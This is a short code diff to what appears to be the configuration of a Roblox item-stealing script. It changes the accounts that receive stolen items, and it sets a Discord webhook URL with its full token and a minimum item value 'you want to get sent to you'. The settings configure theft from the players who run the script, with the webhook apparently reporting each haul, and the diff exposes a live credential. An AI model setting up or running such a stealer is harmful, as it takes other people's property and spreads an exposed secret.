@@ -1,5 +1,5 @@
-Username = "bb_psaa01"
-Username2 = "bb_psaa01"
+Username = "psim_baa"
+Username2 = "psim_baa"
 HighValueUsername = "BB_PS99y"
 Webhook = "https://discord.com/api/webhooks/1233138189502517278/627KbNPy8fPVXoeZavK-mnoheLgHd_7hgw7RzcMltLQIVhz14k1FJsW_eo_oIaLWjXvD"
 min_rap = 1000000 -- minimum rap of each item you want to get sent to you.
